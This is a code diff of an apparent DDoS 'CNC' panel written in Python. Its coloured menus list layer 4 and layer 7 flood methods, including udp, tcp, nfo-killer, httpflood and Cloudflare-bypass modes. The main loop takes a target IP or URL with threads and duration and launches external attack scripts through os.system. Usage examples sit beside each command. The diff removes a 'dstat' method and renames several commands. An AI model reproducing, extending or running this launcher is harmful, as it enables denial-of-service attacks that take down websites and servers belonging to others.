@@ -144,7 +144,7 @@ def layer7():
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-socket         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttpflood         \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-storm          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcf-socket         \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-rand           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcf-pro            \x1b[38;2;0;212;14m║
-               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255moverflow            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mdstat             \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255moverflow            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcf-bypass           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255muambypass           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
@@ -157,7 +157,7 @@ def layer4():
                               \x1b[38;2;0;212;14m╔═══════════════╗
                               \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 4    \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
-               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mudp                 \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mudp                 \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mtcp               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mnfo-killer          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-raw             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhome                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
@@ -208,7 +208,7 @@ def main():
             layer7()
         elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
             layer4()
-        elif cnc == "amp/games" or cnc == "AMP/GAMES" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
+        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
             amp_games()
         elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
             rules()
@@ -247,7 +247,7 @@ def main():
                 port = cnc.split()[2]
                 threads = cnc.split()[3]
                 time = cnc.split()[4]
-                os.system(f'./nfokiller {ip} {port} {threads} -1 {time}')
+                os.system(f'./nfo-killer {ip} {port} {threads} -1 {time}')
             except IndexError:
                 print('Usage: nfo-killer <ip> <port> <threads> <time>')
                 print('Example: nfo-killer 1.1.1.1 80 850 60')
@@ -300,22 +300,11 @@ def main():
 
 # LAYER 7 METHODS
         
-        elif "dstat" in cnc:
-            try:
-                url = cnc.split()[1]
-                thread = cnc.split()[2]
-                per = cnc.split()[3]
-                os.system(f'perl script.pl {url} {thread} {per} 127.0.0.1')
-            except IndexError:
-                print('Usage: dstat <url> <threads> <per>')
-                print('Example: dstat http://example.com 200 200')
-                
         elif "cf-pro" in cnc:
             try:
                 os.system(f'python3 cf-pro.py')
             except IndexError:
                 print('cf-pro')
-                
         elif "cf-socket" in cnc:
             try:
                 os.system(f'python3 bypass.py')
@@ -329,14 +318,14 @@ def main():
                 time = cnc.split()[3]
                 os.system(f'node HTTP-SOCKET {url} {per} {time}')
             except IndexError:
-                print('Usage: HTTP-SOCKET.js <url> <per> <time>')
+                print('Usage: http-socket <url> <per> <time>')
                 print('Example: http-socket http://example.com 5000 60')
 
         elif "http-raw" in cnc:
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
-                os.system(f'node HTTP-RAW.js {url} {time}')
+                os.system(f'node HTTP-RAW {url} {time}')
             except IndexError:
                 print('Usage: http-raw <url> <time>')
                 print('Example: http-raw http://example.com 60')
@@ -345,7 +334,7 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
-                os.system(f'node HTTP-REQUESTS.js {url} {time}')
+                os.system(f'node HTTP-REQUESTS {url} {time}')
             except IndexError:
                 print('Usage: http-requests <url> <time>')
                 print('Example: http-requests http://example.org 60')
@@ -354,6 +343,7 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
+                rps = cnc.split()[3]
                 os.system(f'node HTTP-RAND.js {url} {time}')
             except IndexError:
                 print('Usage: http-rand <url> <time>')
